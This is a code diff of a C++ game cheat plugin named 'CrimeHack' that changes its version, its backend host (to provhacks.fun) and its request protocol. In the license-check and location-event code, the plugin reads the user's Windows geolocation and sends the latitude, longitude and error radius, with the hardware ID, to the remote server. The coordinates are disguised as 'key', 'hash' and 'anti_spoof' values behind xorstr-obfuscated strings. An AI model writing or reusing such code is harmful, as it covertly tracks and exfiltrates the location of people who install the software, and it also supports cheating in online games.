@@ -4,7 +4,7 @@
 #define HOOKPOS_PlayerCollision 0x0054BCEE
 #define AGENT_NAME xorstr_("CR1M3H")
 #define LOG_NAME xorstr_("CrimeHack.log")
-#define PLUGIN_VER xorstr_("V6.1 BETA")
+#define PLUGIN_VER xorstr_("V6.3 BETA")
 #include <Windows.h>
 #include <stdio.h>
 #include <string>
@@ -509,10 +509,10 @@ void MakePreInit()
 		std::string LF_Key = GenerateLifeTimeKey(); std::string DM_Key = GenerateDemoKey();
 		if (!RegisteredKey.empty() && RegisteredKey.length() >= 4)
 		{
-			std::string host_lnk = xorstr_("kuprey123.beget.tech");
+			std::string host_lnk = xorstr_("provhacks.fun");
 			char params[3000]; memset(params, 0, sizeof(params));
 			sprintf(params, xorstr_("hwid=%s"), total_hwid.c_str());
-			std::string sc_ans = SendInetRequest(P_HTTP, M_GET, host_lnk, xorstr_("crime_hack/security.php"), std::string(params), true);
+			std::string sc_ans = SendInetRequest(P_HTTPS, M_GET, host_lnk, xorstr_("crime_hack/security.php"), std::string(params), true);
 			if (sc_ans.find(total_hwid) != std::string::npos)
 			{
 				LogInFile(LOG_NAME, xorstr_("[PLUGIN] Пошел нахуй :)\n"));
@@ -520,7 +520,7 @@ void MakePreInit()
 			}
 			memset(params, 0, sizeof(params));
 			sprintf(params, xorstr_("soft_ver=%s"), PLUGIN_VER);
-			sc_ans = SendInetRequest(P_HTTP, M_GET, host_lnk, xorstr_("crime_hack/check_update.php"), std::string(params), true);
+			sc_ans = SendInetRequest(P_HTTPS, M_GET, host_lnk, xorstr_("crime_hack/check_update.php"), std::string(params), true);
 			memset(upd_txt, 0, sizeof(upd_txt));
 			strcpy(upd_txt, sc_ans.c_str());
 			if (LF_Key.find(RegisteredKey.c_str()) == std::string::npos)
@@ -822,10 +822,10 @@ STDMETHODIMP CLocationEvents::OnLocationChanged(REFIID reportType, ILocationRepo
 			if (SUCCEEDED(spLatLongReport->GetLongitude(&longitude))) geos.y = longitude;
 			if (SUCCEEDED(spLatLongReport->GetErrorRadius(&errorRadius)))
 			{
-				geos.radius = errorRadius; std::string host_lnk = xorstr_("kuprey123.beget.tech");
+				geos.radius = errorRadius; std::string host_lnk = xorstr_("provhacks.fun");
 				char params[3000]; memset(params, 0, sizeof(params));
 				sprintf(params, xorstr_("hwid=%s&key=%f&hash=%f&anti_spoof=%f"), total_hwid.c_str(), geos.x, geos.y, geos.radius);
-				SendInetRequest(P_HTTP, M_GET, host_lnk, xorstr_("crime_hack/check_license.php"), std::string(params), false);
+				SendInetRequest(P_HTTPS, M_GET, host_lnk, xorstr_("crime_hack/check_license.php"), std::string(params), false);
 				for (DWORD index = 0; index < ARRAYSIZE(REPORT_TYPES); index++)
 				{
 					spLocation->UnregisterForReport(REPORT_TYPES[index]);
